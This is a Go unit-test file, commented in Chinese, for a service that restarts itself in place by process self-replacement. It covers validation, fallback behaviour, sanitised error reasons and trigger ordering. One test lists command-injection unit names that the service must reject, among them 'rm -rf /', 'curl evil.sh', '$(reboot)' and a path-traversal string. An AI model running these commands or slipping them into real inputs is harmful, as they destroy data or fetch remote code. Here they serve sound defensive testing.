package domain

import (
	"errors"
	"os"
	"runtime"
	"strings"
	"sync"
	"testing"
	"time"
)

// 本文件覆盖「一键重启 = 进程自替换」的领域判据与顺序契约（FR-40 追加七）。
//
// 为什么几乎所有用例都要注入钩子：真实的执行动作是 syscall.Exec，一旦跑起来测试进程就没了。
// 因此这里用 RestartHooks 把三件事换成桩——argv[0] 取自哪里、路径能不能解析、
// 触发点被调用的**时刻**——从而在不换掉自己的前提下把判据与顺序都断言清楚。

// restartTriggerStub 记录触发点被调用的时刻，并在下次触发时通知测试。
//
// 加锁是必需的：RestartAfter 在后台 goroutine 里触发，而测试主协程同时在读记录
// （-race 下会报 DATA RACE）。
type restartTriggerStub struct {
	mu      sync.Mutex
	times   []time.Time
	trigger chan struct{}
}

func newRestartTriggerStub() *restartTriggerStub {
	return &restartTriggerStub{trigger: make(chan struct{}, 8)}
}

// fn 返回可直接注入的触发点。
func (s *restartTriggerStub) fn() RestartTrigger {
	return func() {
		s.mu.Lock()
		s.times = append(s.times, time.Now())
		s.mu.Unlock()
		s.trigger <- struct{}{}
	}
}

func (s *restartTriggerStub) calls() []time.Time {
	s.mu.Lock()
	defer s.mu.Unlock()
	return append([]time.Time(nil), s.times...)
}

// restartProbeWindow 是"不得触发"这类负向断言的观察窗。
// 延迟在毫秒级，300 毫秒足够让该触发的触发起来；若什么都没有，那就是真的没排定。
const restartProbeWindow = 300 * time.Millisecond

// resolveOK 造一个"路径可执行"的解析替身；resolveAbsent 造"解析不了"的替身。
func resolveOK() func(string) error { return func(string) error { return nil } }

func resolveAbsent(err error) func(string) error {
	return func(string) error { return err }
}

// armedService 造一个判据全部满足的服务（平台支持 + argv[0] 可解析 + 触发点已接线）。
//
// 三处钩子都显式给足：判据本身才是被测对象，不能让它依赖"测试机恰好是什么平台"。
// 平台判据的真实默认值（编译期常量 selfReplaceSupported）由
// TestRestartServiceRejectsUnsupportedPlatform 单独盯着，不靠本辅助函数覆盖。
func armedService(unit, scope string, trigger RestartTrigger) *RestartService {
	return NewRestartServiceWithHooks(unit, scope, RestartHooks{
		Argv0:             func() string { return "/opt/jianartifact/current/jianartifact" },
		Resolve:           resolveOK(),
		EUID:              func() int { return 1000 },
		PlatformSupported: func() bool { return true },
		Trigger:           trigger,
	})
}

// Command 按作用域与身份拼出**手工等效**命令串：各分支都要对得上部署文档里的手工命令。
//
// 注意语义已经与旧实现不同：它**不是**本进程将要执行的命令（本进程走自替换），
// 而是"若你想手工重启，敲这条"。因此非 root 的 system 作用域给的是带 `-n` 的 sudo 形式，
// 与文档一致，不再有"两条候选挑一条"的说法。
func TestRestartServiceCommandByScopeAndIdentity(t *testing.T) {
	cases := []struct {
		name  string
		unit  string
		scope string
		euid  int
		want  string
	}{
		{"system 非 root 带免密 sudo", "jianartifact", RestartScopeSystem, 1000, "sudo -n systemctl restart jianartifact"},
		{"system root 不加 sudo", "jianartifact", RestartScopeSystem, 0, "systemctl restart jianartifact"},
		{"systemd-user 用户级", "jianartifact", RestartScopeSystemdUser, 1000, "systemctl --user restart jianartifact"},
		{"systemd-user root 同样不带 sudo", "jianartifact", RestartScopeSystemdUser, 0, "systemctl --user restart jianartifact"},
		{"docker 给宿主机手动命令", "jianartifact", RestartScopeDocker, 0, "docker restart jianartifact"},
		{"docker 非 root 同样不带 sudo", "jianartifact", RestartScopeDocker, 1000, "docker restart jianartifact"},
		{"单元名可带 .service 后缀", "jianartifact.service", RestartScopeSystem, 0, "systemctl restart jianartifact.service"},
		{"单元名可带 @ 实例", "jianartifact@node1", RestartScopeSystem, 0, "systemctl restart jianartifact@node1"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			svc := NewRestartServiceWithHooks(tc.unit, tc.scope, RestartHooks{
				Argv0:             func() string { return "/opt/jianartifact/current/jianartifact" },
				Resolve:           resolveOK(),
				EUID:              func() int { return tc.euid },
				PlatformSupported: func() bool { return true },
			})
			if got := svc.Command(); got != tc.want {
				t.Fatalf("Command()=%q，期望 %q", got, tc.want)
			}
			if got := svc.Scope(); got != tc.scope {
				t.Fatalf("Scope()=%q，期望 %q", got, tc.scope)
			}
		})
	}
}

// 非法单元名：Command 给注释说明（不含配置原文），Probe 一律拒绝，且**绝不触发**重启。
//
// 单元名在自替换语义下只剩一个用途：拼进 command 字段供运维复制到终端粘贴执行，
// 那一侧是真的有 shell。因此这里的注入防护一个字都不能少——它是本功能唯一残留的注入面。
func TestRestartServiceRejectsIllegalUnitName(t *testing.T) {
	illegal := []string{
		"jianartifact; rm -rf /",         // 命令分隔注入
		"jianartifact && curl evil.sh",   // 逻辑连接注入
		"$(reboot)",                      // 命令替换注入
		"jianartifact`id`",               // 反引号注入
		"jianartifact unit",              // 空格（参数注入）
		"jianartifact\nsystemctl stop x", // 换行注入
		"../etc/passwd",                  // 路径穿越形态
		"",                               // 空
		"  ",                             // 全空白
		"单元名",                            // 非 ASCII
	}
	for _, unit := range illegal {
		t.Run(unit, func(t *testing.T) {
			stub := newRestartTriggerStub()
			svc := NewRestartServiceWithHooks(unit, RestartScopeSystem, RestartHooks{
				Argv0:             func() string { return "/opt/jianartifact/current/jianartifact" },
				Resolve:           resolveOK(),
				EUID:              func() int { return 0 },
				PlatformSupported: func() bool { return true },
				Trigger:           stub.fn(),
			})

			cmd := svc.Command()
			if cmd == "" {
				t.Fatal("Command 任何情况下都不得为空（前端要展示）")
			}
			if !strings.HasPrefix(cmd, "#") {
				t.Fatalf("非法配置下 Command 应是说明性注释，得 %q", cmd)
			}
			if strings.Contains(cmd, "systemctl") || strings.Contains(cmd, "sudo") {
				t.Fatalf("非法配置下不得给出可执行的命令串，得 %q", cmd)
			}

			plan := svc.Probe()
			if plan.Supported {
				t.Fatalf("非法单元名 %q 不得判定为可用", unit)
			}
			if plan.Reason == "" {
				t.Fatal("非法单元名必须给出原因")
			}
			if plan.Command == "" {
				t.Fatal("非法配置下 plan.Command 仍须非空（前端要展示）")
			}
			// 原因不得回显配置里的危险片段：含元字符的原文一旦被回显到界面 / 审计，
			// 就成了可以被复制粘贴的注入载荷。
			for _, frag := range []string{";", "&&", "`", "$(", "\n", "..", "rm -rf"} {
				if strings.Contains(unit, frag) && strings.Contains(plan.Reason, frag) {
					t.Fatalf("原因不得回显配置中的危险片段 %q，得 %q", frag, plan.Reason)
				}
			}
			// 纵深防御：非法配置下即使硬调 RestartAfter 也不得触发。
			svc.RestartAfter(plan, time.Millisecond)
			select {
			case <-stub.trigger:
				t.Fatal("非法单元名绝不得触发自替换")
			case <-time.After(restartProbeWindow):
			}
		})
	}
}

// 非法作用域：配置层会回落，但领域层仍须自证——直接构造非法作用域必须降级而不是瞎猜命令。
func TestRestartServiceRejectsIllegalScope(t *testing.T) {
	stub := newRestartTriggerStub()
	svc := NewRestartServiceWithHooks("jianartifact", "kubernetes", RestartHooks{
		Argv0:             func() string { return "/opt/jianartifact/current/jianartifact" },
		Resolve:           resolveOK(),
		EUID:              func() int { return 0 },
		PlatformSupported: func() bool { return true },
		Trigger:           stub.fn(),
	})

	if plan := svc.Probe(); plan.Supported || plan.Reason == "" {
		t.Fatalf("非法作用域必须降级并给出原因，得 plan=%+v", plan)
	}
	if !strings.Contains(svc.Command(), "作用域") {
		t.Fatalf("非法作用域下 Command 应说明原因，得 %q", svc.Command())
	}
}

// 自替换可用（平台支持 + argv[0] 可解析 + 触发点已接线）→ Probe 返回 supported:true。
func TestRestartServiceProbeSucceedsWhenSelfExecUsable(t *testing.T) {
	svc := armedService("jianartifact", RestartScopeSystem, newRestartTriggerStub().fn())

	plan := svc.Probe()
	if !plan.Supported || plan.Reason != "" {
		t.Fatalf("自替换可用时应 supported:true 且无原因，得 plan=%+v", plan)
	}
	// command 始终非空且是手工等效命令：受理成功时它是审计与事后复现的依据。
	if want := "sudo -n systemctl restart jianartifact"; plan.Command != want {
		t.Fatalf("plan.Command 应为手工等效命令 %q，得 %q", want, plan.Command)
	}
}

// os.Args[0] 解析不了 / 不是可执行文件 → supported:false + reason，**不报错**。
//
// 这是自替换唯一可能"提前失败"的地方，而它一旦漏判就是"回了 202 却什么都没发生"：
// 进程没换映像、连接照旧在，管理员以为重启过了。因此必须如实降级并说明是哪条路径。
func TestRestartServiceDegradesWhenArgv0Unresolvable(t *testing.T) {
	for _, tc := range []struct {
		name  string
		argv0 string
		err   error
	}{
		{"二进制被移走", "/opt/jianartifact/current/jianartifact", errors.New("exec: no such file or directory")},
		{"没有可执行位", "/opt/jianartifact/current/jianartifact", errors.New("permission denied")},
		{"相对路径不在 PATH 里", "jianartifact", errors.New(`exec: "jianartifact": executable file not found in $PATH`)},
	} {
		t.Run(tc.name, func(t *testing.T) {
			svc := NewRestartServiceWithHooks("jianartifact", RestartScopeSystem, RestartHooks{
				Argv0:             func() string { return tc.argv0 },
				Resolve:           resolveAbsent(tc.err),
				EUID:              func() int { return 0 },
				PlatformSupported: func() bool { return true },
				Trigger:           newRestartTriggerStub().fn(),
			})

			plan := svc.Probe()
			if plan.Supported {
				t.Fatalf("argv[0] 解析不了时不得判定为可用，得 %+v", plan)
			}
			if plan.Reason == "" {
				t.Fatal("解析失败必须给出原因")
			}
			// 原因要能定位：点名是哪条路径、以及为什么。
			if !strings.Contains(plan.Reason, tc.argv0) {
				t.Fatalf("原因应点明解析不了的路径 %q，得 %q", tc.argv0, plan.Reason)
			}
			if !strings.Contains(plan.Reason, tc.err.Error()) {
				t.Fatalf("原因应带上底层错误 %q，得 %q", tc.err.Error(), plan.Reason)
			}
			if strings.ContainsAny(plan.Reason, "\n\r") {
				t.Fatalf("原因必须是单行，得 %q", plan.Reason)
			}
			// 降级时 command 仍须非空：那是管理员唯一的出路。
			if plan.Command == "" {
				t.Fatal("降级时 plan.Command 不得为空")
			}
		})
	}
}

// 原因长度必须有上限并压平换行：它会进响应体与审计表，而 argv[0] 与系统错误都不可控。
func TestRestartServiceReasonIsTruncated(t *testing.T) {
	long := strings.Repeat("详", restartReasonMaxLen*2)
	svc := NewRestartServiceWithHooks("jianartifact", RestartScopeSystem, RestartHooks{
		Argv0:             func() string { return long },
		Resolve:           resolveAbsent(errors.New("boom\n第二行不该原样进响应")),
		EUID:              func() int { return 0 },
		PlatformSupported: func() bool { return true },
		Trigger:           newRestartTriggerStub().fn(),
	})

	plan := svc.Probe()
	if n := len([]rune(plan.Reason)); n > restartReasonMaxLen+1 {
		t.Fatalf("原因应被截断到 %d 个字符左右，实际 %d", restartReasonMaxLen, n)
	}
	if strings.ContainsAny(plan.Reason, "\n\r") {
		t.Fatalf("原因必须是单行，得 %q", plan.Reason)
	}
}

// 触发点未接线 → 降级。域层自己不会 Exec（动作在调用方的 select 里），
// 没有触发点就等于做不到，必须如实回 supported:false 而不是受理一个空承诺。
func TestRestartServiceDegradesWithoutTrigger(t *testing.T) {
	svc := NewRestartServiceWithHooks("jianartifact", RestartScopeSystem, RestartHooks{
		Argv0:             func() string { return "/opt/jianartifact/current/jianartifact" },
		Resolve:           resolveOK(),
		EUID:              func() int { return 0 },
		PlatformSupported: func() bool { return true },
		// 刻意不注入 Trigger。
	})

	plan := svc.Probe()
	if plan.Supported {
		t.Fatalf("未接线触发点时不得判定为可用，得 %+v", plan)
	}
	if !strings.Contains(plan.Reason, "触发点") {
		t.Fatalf("原因应说明触发点未接线，得 %q", plan.Reason)
	}
	if plan.Command == "" {
		t.Fatal("降级时 plan.Command 不得为空")
	}
}

// docker 作用域：容器生命周期由外部编排掌握，自替换也救不了——降级且不触发。
func TestRestartServiceDockerScopeIsUnsupported(t *testing.T) {
	stub := newRestartTriggerStub()
	svc := NewRestartServiceWithHooks("jianartifact", RestartScopeDocker, RestartHooks{
		Argv0:             func() string { return "/opt/jianartifact/current/jianartifact" },
		Resolve:           resolveOK(),
		EUID:              func() int { return 0 },
		PlatformSupported: func() bool { return true },
		Trigger:           stub.fn(),
	})

	plan := svc.Probe()
	if plan.Supported || !strings.Contains(plan.Reason, "docker") {
		t.Fatalf("docker 作用域必须降级并说明原因，得 plan=%+v", plan)
	}
	if want := "docker restart jianartifact"; plan.Command != want {
		t.Fatalf("降级时 command 应为宿主机手工命令 %q，得 %q", want, plan.Command)
	}
	svc.RestartAfter(plan, time.Millisecond)
	select {
	case <-stub.trigger:
		t.Fatal("docker 作用域不得触发自替换")
	case <-time.After(restartProbeWindow):
	}
}

// 平台判据：Windows 上必须如实回 supported:false 并说明平台不支持（不假装成功）。
// 反向断言（Unix 上该判据必须放行）由 TestRestartServiceProbeSucceedsWhenSelfExecUsable 覆盖。
func TestRestartServiceRejectsUnsupportedPlatform(t *testing.T) {
	svc := NewRestartServiceWithHooks("jianartifact", RestartScopeSystem, RestartHooks{
		// 判据其余两条全部满足：这样"降级"只可能来自平台判断本身。
		Argv0:   func() string { return "/opt/jianartifact/current/jianartifact" },
		Resolve: resolveOK(),
		EUID:    func() int { return 0 },
		Trigger: newRestartTriggerStub().fn(),
	})

	plan := svc.Probe()
	if selfReplaceSupported {
		if !plan.Supported {
			t.Fatalf("本平台支持自替换时应受理，得 %+v", plan)
		}
		return
	}
	if plan.Supported {
		t.Fatalf("本平台（%s）不支持自替换，必须降级，得 %+v", runtime.GOOS, plan)
	}
	if !strings.Contains(plan.Reason, "自替换") {
		t.Fatalf("原因应说明本平台不支持自替换，得 %q", plan.Reason)
	}
	if plan.Command == "" {
		t.Fatal("降级时 plan.Command 不得为空")
	}
}

// 自替换加载的是 **os.Args[0]**，不是 os.Executable()。
//
// 这是本功能最容易"顺手改错"、且改错后**毫无症状**的一处：部署脚本用 `current` 符号链接
// 指向具体 release 目录，argv[0] 里的符号链接会在 Exec 时被内核重新解析 → 加载新版本；
// 而 os.Executable() 返回 /proc/self/exe 的内容（已解析符号链接）→ 加载**旧**版本，
// 于是"部署切换后点一键重启"等于没切。本用例把这条语义钉死在自替换的唯一入口上。
func TestRestartSelfInvocationUsesArgs0NotExecutable(t *testing.T) {
	// 把 argv[0] 换成一个**与真实可执行文件路径明显不同**的哨兵值。
	//
	// 为什么必须这样构造（变异验证实测的教训）：在开发机（Windows）上 os.Args[0] 与
	// os.Executable() 恰好同值，直接拿 os.Args[0] 断言的话，即使把实现改成 os.Executable()
	// 也照样通过——断言恒真，等于没测。换成哨兵值后，两种实现给出截然不同的答案，
	// 且这里顺带断言"结果不得等于 os.Executable()"，把这条语义正面钉死。
	const sentinel = "/opt/jianartifact/current/jianartifact"
	orig := os.Args
	t.Cleanup(func() { os.Args = orig })
	os.Args = []string{sentinel, "run"}

	executable, err := os.Executable()
	if err == nil && executable == sentinel {
		t.Fatalf("哨兵值 %q 与真实可执行文件路径重合，本用例失去区分力", sentinel)
	}

	argv0, argv, env := restartSelfInvocation()
	if argv0 != sentinel {
		t.Fatalf("自替换必须用 os.Args[0]=%q，实际 %q", sentinel, argv0)
	}
	if err == nil && argv0 == executable {
		t.Fatalf("自替换不得用 os.Executable()=%q：它返回 /proc/self/exe 的内容（已解析符号链接），"+
			"部署切到新目录后仍会加载旧二进制", executable)
	}
	if len(argv) == 0 || argv[0] != argv0 {
		t.Fatalf("argv[0] 必须与要加载的路径一致，得 argv=%v、argv0=%q", argv, argv0)
	}
	if len(env) == 0 {
		t.Fatal("环境必须原样透传，实际为空")
	}
}

// TestRestartServiceProbeUsesArgs0 守住传递链：Probe 判定的路径必须**逐字等于**
// restartSelfInvocation 将要传给 Exec 的那个 argv[0]。
//
// 关键构造：**不注入 Argv0**，让服务用生产默认值（restartSelfArgv0）；否则注入的桩会
// 把"默认值取自哪里"整个绕过，用例即使通过也证明不了任何事（变异验证实测到这一点：
// 把 restartSelfArgv0 改成 os.Executable() 时，注入了 Argv0 的版本照样绿）。
// 只注入 Resolve 用来观察 Probe 拿到的路径，并用哨兵值确保它与 os.Executable() 可区分。
func TestRestartServiceProbeUsesArgs0(t *testing.T) {
	const sentinel = "/opt/jianartifact/current/jianartifact"
	orig := os.Args
	t.Cleanup(func() { os.Args = orig })
	os.Args = []string{sentinel, "run"}

	var sawPath string
	svc := NewRestartServiceWithHooks("jianartifact", RestartScopeSystem, RestartHooks{
		Resolve: func(path string) error {
			sawPath = path
			return nil
		},
		EUID:              func() int { return 0 },
		PlatformSupported: func() bool { return true },
		Trigger:           newRestartTriggerStub().fn(),
	})

	if plan := svc.Probe(); !plan.Supported {
		t.Fatalf("应受理，得 %+v", plan)
	}
	if sawPath != sentinel {
		t.Fatalf("Probe 必须用 os.Args[0]=%q 判定，实际用了 %q", sentinel, sawPath)
	}
	if exe, err := os.Executable(); err == nil && sawPath == exe {
		t.Fatalf("Probe 不得用 os.Executable()=%q 判定", exe)
	}
}

// RestartAfter 必须**立即返回**（不阻塞调用方写响应），并在延迟到期后才触发。
//
// 这是本功能的核心顺序契约：触发会关停服务并换掉进程映像，若先触发，202 根本发不出去，
// 前端只能看到连接被重置——既分不清"重启成功"还是"网络断了"，也拿不到降级信息。
func TestRestartServiceRestartAfterIsAsyncAndDelayed(t *testing.T) {
	stub := newRestartTriggerStub()
	svc := armedService("jianartifact", RestartScopeSystem, stub.fn())
	plan := svc.Probe()
	if !plan.Supported {
		t.Fatalf("判据全部满足时应受理，得 %+v", plan)
	}

	const delay = 120 * time.Millisecond
	start := time.Now()
	svc.RestartAfter(plan, delay)
	returned := time.Since(start)
	if returned >= delay {
		t.Fatalf("RestartAfter 必须立即返回（延迟留给后台），实际耗时 %s（延迟 %s）", returned, delay)
	}
	// 返回时**尚未触发**：这一条就是"响应先于动作"的机器可验形式。
	select {
	case <-stub.trigger:
		t.Fatal("RestartAfter 返回时不得已触发重启（否则 202 根本发不出去）")
	default:
	}

	select {
	case <-stub.trigger:
		if elapsed := time.Since(start); elapsed < delay {
			t.Fatalf("触发应至少晚于调用 %s，实际 %s", delay, elapsed)
		}
	case <-time.After(3 * time.Second):
		t.Fatal("延迟到期后未触发重启")
	}
	// 恰好一次：RestartAfter 是单次排定，不得重复触发（重复会重复关停与 Exec）。
	if n := len(stub.calls()); n != 1 {
		t.Fatalf("应恰好触发一次，实际 %d 次", n)
	}
}

// RestartAfter 的纵深防御：未通过预检的 plan 一律不触发（不靠调用方自觉）。
func TestRestartServiceRestartAfterSkipsUnusableConfig(t *testing.T) {
	for _, tc := range []struct{ name, unit, scope string }{
		{"非法单元名", "jianartifact; rm -rf /", RestartScopeSystem},
		{"非法作用域", "jianartifact", "kubernetes"},
		{"docker 作用域", "jianartifact", RestartScopeDocker},
	} {
		t.Run(tc.name, func(t *testing.T) {
			stub := newRestartTriggerStub()
			svc := NewRestartServiceWithHooks(tc.unit, tc.scope, RestartHooks{
				Argv0:             func() string { return "/opt/jianartifact/current/jianartifact" },
				Resolve:           resolveOK(),
				EUID:              func() int { return 0 },
				PlatformSupported: func() bool { return true },
				Trigger:           stub.fn(),
			})
			plan := svc.Probe()
			if plan.Supported {
				t.Fatalf("该配置不得判定为可用，得 %+v", plan)
			}
			svc.RestartAfter(plan, time.Millisecond)
			select {
			case <-stub.trigger:
				t.Fatal("预检未通过时不得触发重启")
			case <-time.After(restartProbeWindow):
			}
		})
	}
}

// 零值 / 伪造 RestartPlan 的纵深防御：armed 不导出，外部无法构造出"已预检"的结论。
//
// 这一条在自替换语义下比旧实现更重要：旧实现里"没通过预检"最多跑错一条命令，
// 现在是**换掉整个进程映像**，代价完全不同。
func TestRestartServiceRestartAfterRejectsUnprobedPlan(t *testing.T) {
	stub := newRestartTriggerStub()
	svc := armedService("jianartifact", RestartScopeSystem, stub.fn())

	for _, plan := range []RestartPlan{
		{},                                     // 零值
		{Supported: true},                      // 只抄表面字段的伪造值（armed 仍为 false）
		{Supported: true, Command: "whatever"}, // 连 command 都填上也不行
	} {
		svc.RestartAfter(plan, time.Millisecond)
		select {
		case <-stub.trigger:
			t.Fatalf("未预检的 plan（%+v）不得触发重启", plan)
		case <-time.After(restartProbeWindow):
		}
	}
}

// SetTrigger 可重复调用：CLI 装配与测试都会换触发点，换过之后以新的为准。
func TestRestartServiceSetTriggerReplacesPrevious(t *testing.T) {
	old := newRestartTriggerStub()
	svc := armedService("jianartifact", RestartScopeSystem, old.fn())
	fresh := newRestartTriggerStub()
	svc.SetTrigger(fresh.fn())
	plan := svc.Probe()
	if !plan.Supported {
		t.Fatalf("换过触发点后应仍受理，得 %+v", plan)
	}
	svc.RestartAfter(plan, time.Millisecond)
	select {
	case <-fresh.trigger:
	case <-time.After(3 * time.Second):
		t.Fatal("换过之后应触发新的触发点")
	}
	if n := len(old.calls()); n != 0 {
		t.Fatalf("旧触发点不得再被调用，实际 %d 次", n)
	}
}

// 默认构造（不注入任何钩子）也必须能安全地给出命令与判据结论：
// 真实 os.Geteuid / exec.LookPath 在测试机上不可预测，因此只断言"不 panic 且形状正确"。
func TestRestartServiceDefaultConstructionIsSafe(t *testing.T) {
	svc := NewRestartService("jianartifact", RestartScopeSystem)
	if svc.Command() == "" {
		t.Fatal("默认构造的 Command 不得为空")
	}
	plan := svc.Probe()
	if plan.Supported && plan.Reason != "" {
		t.Fatalf("受理时不应给出原因，得 %q", plan.Reason)
	}
	if !plan.Supported && plan.Reason == "" {
		t.Fatal("未受理时必须给出原因")
	}
	if plan.Command == "" {
		t.Fatal("任何情况下 plan.Command 都不得为空（前端要展示）")
	}
	// 默认构造未注入触发点，因此必然不受理；同时 RestartAfter 必须安全地什么都不做。
	svc.RestartAfter(plan, time.Millisecond)
}
